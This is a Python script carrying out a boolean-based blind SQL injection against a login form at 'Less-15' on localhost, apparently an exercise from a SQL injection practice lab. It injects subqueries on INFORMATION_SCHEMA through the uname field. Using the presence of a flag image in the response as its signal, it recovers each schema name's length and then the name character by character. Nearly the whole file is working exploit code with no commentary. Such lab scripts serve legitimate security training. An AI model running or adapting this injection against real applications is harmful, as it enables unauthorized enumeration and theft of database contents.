import requests
import string
import sys
def get_length(url, data, comment):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    for i in range(20,4,-1):
        r = requests.post(url,data = data + str(i) + comment,headers=headers).text
        # print(url + str(i) + comment)
        if 'images/flag.jpg' in r:
            return i

def send(url,data):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(url,data=data,headers=headers).text
    if 'images/flag.jpg' in r:
        return True
    else:
        return False

alphabet = string.ascii_lowercase + '_'
url = "http://localhost/Less-15/"
data = "passwd=1&submit=Submit&uname=1' or  "
#payload = "left((select database()),"
payload_length_1 = "length((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit " 
payload_length_2 = ",1))="
payload1 = "left((select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit " 
payload2 = ",1)," 
payload3 = ")='"
comment = '--+' 
count = 1
result = ""
dbs = []

for i in range(0,5):
    length = get_length(url, data + payload_length_1 + str(i) + payload_length_2,comment)
    for j in range(length):
        for c in alphabet:
            final_url = data + payload1 + str(i) + payload2 + str(count) + payload3 + (result+c) + "'" + comment
            # print(final_url)
            if send(url, final_url):
                count += 1
                result += c
                # print(result)
                sys.stdout.write(c)
                sys.stdout.flush()
    sys.stdout.write("\r\n")
    sys.stdout.flush()
    dbs.append(result)
    result = ""
    count = 1
print("[+] Found: List database: {}".format(dbs))
